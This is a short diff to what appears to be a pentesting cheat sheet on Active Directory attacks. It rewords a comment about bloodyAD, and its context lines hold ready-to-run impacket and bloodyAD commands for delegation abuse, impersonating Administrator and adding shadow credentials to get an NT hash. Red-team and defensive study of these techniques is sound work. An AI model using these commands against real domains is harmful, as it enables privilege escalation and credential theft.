@@ -331,7 +331,8 @@ impacket-rbcd -delegate-from '<machine_account>$' -delegate-to '<target>$' -acti
 impacket-getST -spn cifs/<target> -impersonate Administrator -dc-ip <ip_address> <domain>/'<machine_account>$':'<machine_password>'
 # companion:end rbcd-impacket
 
-# bloodyAD — raw-LDAP swiss-army knife for the same primitives (shadow-creds / RBCD / DACL / attribute writes)
+# bloodyAD (apt pkg 'bloodyad'; the installed CLI is camelCase 'bloodyAD') — raw-LDAP swiss-army
+# knife for the same primitives (shadow-creds / RBCD / DACL / attribute writes)
 # over ONE LDAP channel; quieter than certipy+impacket once you already hold the write, and autobloody can
 # auto-walk a BloodHound-graphed path end to end:
 bloodyAD -u <user> -p <password> -d <domain> --host <ip_address> add shadowCredentials <target>   # KeyCredentialLink -> PKINIT -> NT hash
